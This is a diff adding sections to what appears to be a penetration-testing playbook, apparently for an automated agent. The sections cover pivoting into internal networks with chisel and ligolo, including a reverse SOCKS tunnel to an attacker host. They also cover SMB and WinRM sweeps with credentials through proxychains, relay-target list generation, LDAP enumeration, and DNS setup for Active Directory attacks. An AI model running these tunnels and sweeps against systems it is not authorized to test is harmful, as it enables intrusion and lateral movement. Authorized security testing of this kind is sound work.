@@ -33,6 +33,52 @@ chisel client <ATTACKER>:8080 R:socks
 # then: proxychains4 nxc smb <internal-target> ...
 ```
 
+## Network enumeration through a pivot
+Once the tunnel is verified, scan the internal network methodically:
+```bash
+# Service discovery through SOCKS (proxychains)
+proxychains4 nmap -sT -Pn -T4 -p 21,22,80,88,135,139,389,443,445,1433,3268,3389,5985 <subnet>/24
+# nxc is faster for SMB/WinRM sweeps
+proxychains4 nxc smb <subnet>/24 --gen-relay-list /workspace/loot/relay-targets.txt
+proxychains4 nxc winrm <subnet>/24 -u <U> -p '<P>'
+# LDAP enumeration through the pivot
+proxychains4 ldapsearch -H ldap://<DC-IP> -D '<user>@<dom>' -w '<pass>' -b 'DC=...' '(objectClass=computer)' dNSHostName
+```
+Record discovered hosts: `note service '<ip>:<port> <service> [via pivot through <host>]'`.
+Add each to the wiki: `wiki add hosts/<ip> '<what you found>'`.
+
+## Multiple concurrent pivots
+On a network with multiple segments (e.g. DMZ -> corporate -> server VLAN),
+you may need layered pivots:
+- **One chisel/ligolo per hop**: HOST-A (DMZ) tunnels to segment B, HOST-B
+  (segment B) tunnels to segment C.
+- **Port assignment**: use different SOCKS ports per pivot (1080, 1081, 1082)
+  and match them in separate proxychains configs:
+  ```bash
+  cp /etc/proxychains4.conf /etc/proxychains4-seg2.conf
+  # edit: socks5 127.0.0.1 1081
+  proxychains4 -f /etc/proxychains4-seg2.conf nxc smb <seg2-target>
+  ```
+- **Chained proxychains**: for a double-hop, configure proxychains with two
+  SOCKS entries (one per hop) — but this is fragile; prefer ligolo-ng with
+  multiple agents or nested chisel tunnels.
+- Track every active pivot on the board: `note pivot 'chisel :1080 via WEB01 -> 172.16.1.0/24'`.
+
+## DNS resolution through pivots (critical for Kerberos/AD)
+Kerberos, LDAP, and many AD tools REQUIRE hostnames, not IPs. Through a pivot:
+1. Add internal hostnames to `/etc/hosts` on the attacker:
+   ```bash
+   echo "172.16.1.10 DC01.corp.local corp.local" >> /etc/hosts
+   ```
+2. Or point DNS through the pivot — set the DC as your nameserver:
+   ```bash
+   echo "nameserver 172.16.1.10" > /etc/resolv.conf
+   ```
+   (Only works if DNS traffic routes through the tunnel — ligolo handles this;
+   chisel SOCKS needs `proxychains4 nslookup`.)
+3. **Always verify resolution before running AD tools**:
+   `proxychains4 nslookup DC01.corp.local 172.16.1.10`
+
 ## Gotchas
 - Route the DC's IP explicitly through the tunnel if your OS has a direct
   route to the range that shadows it.
